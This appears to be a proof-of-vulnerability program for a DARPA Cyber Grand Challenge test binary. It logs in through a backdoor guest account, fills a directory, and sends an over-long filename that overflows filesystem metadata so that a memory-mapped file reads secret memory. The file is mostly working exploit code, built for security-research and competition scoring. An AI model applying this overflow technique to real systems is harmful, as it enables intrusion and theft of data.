/*

Author: Steve Wood <swood@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include <libcgc.h>
#include "stdlib.h"
#include "stdio.h"
#include "string.h"


int receive_bytes (int fd, void *buffer, size_t count) 
{
size_t total;
size_t rxbytes;

    total = 0;

    while(total < count)  {

        rxbytes = 0;

        if (receive(fd, buffer+total, count-total, &rxbytes)==0 ) {

            total += rxbytes;

        }
        
        else {

            return(-1);
        }

    }

return 0;

}


int main(void)
{

char buffer[60];
int i;

int pov_type;
unsigned int type2_addr;
unsigned int type2_length;
unsigned int type2_size;
unsigned int new_offset_value;


	// negotiate a type 2 POV
	pov_type = 2;

	if (write(3, &pov_type, sizeof(pov_type)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &type2_addr, sizeof(type2_addr)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &type2_size, sizeof(type2_size)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &type2_length, sizeof(type2_length)) == -1)
		_terminate(-1);

	// get the login prompt
	receive_bytes(STDIN, buffer, 7);
	
	// login with the backdoor GUEST account
	write(STDOUT, "GUEST 2\n", 8);

	// command prompt
	receive_bytes(STDIN, buffer, 26);

	// get rid of the README.txt file in position 0 of the file directory
	// this position can be overwritten 
	write(STDOUT, "erase README.txt\n", 17);

	// command prompt
	receive_bytes(STDIN, buffer, 2);

	// make a memory mapped file that can be overwritten to exploit the vuln
	strcpy(buffer, "makememfile exploitme.mem 4096\n");
	// printf();
	write(STDOUT, buffer, strlen(buffer));

	receive_bytes(STDIN, buffer, 2);

	// now fill the directory up with files 
	for (i = 0; i < 125; ++i ) {

		sprintf(buffer, "make file$d\n", i);
		write(STDOUT, buffer, strlen(buffer));

		receive_bytes(STDIN, buffer, 2);
	}

	// now its time for the overwrite.  only a max sized filename will reach into the next 
	// block of the filesystem and overwrite the memory mapped file's info
	strcpy(buffer, "make AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

	// put in the address of the magic page
	// add two to the end so that it doesn't put a null into the string prematurely
	*(int *)(buffer+41) = type2_addr + 2;

	buffer[45] = '\n';
	write(STDOUT, buffer, 46);

	receive_bytes(STDIN, buffer, 2);

	// the memory mapped file should now point to the magic page so just read it to get secret data
	write(STDOUT, "show exploitme.mem\n", 19);

	receive_bytes(STDIN, buffer, 4);

	// now write the returned data back to the POV server for scoring
	write(3, buffer, 4);

	// send the command to exit the CB
	write(STDOUT, "exit\n", 5);

}

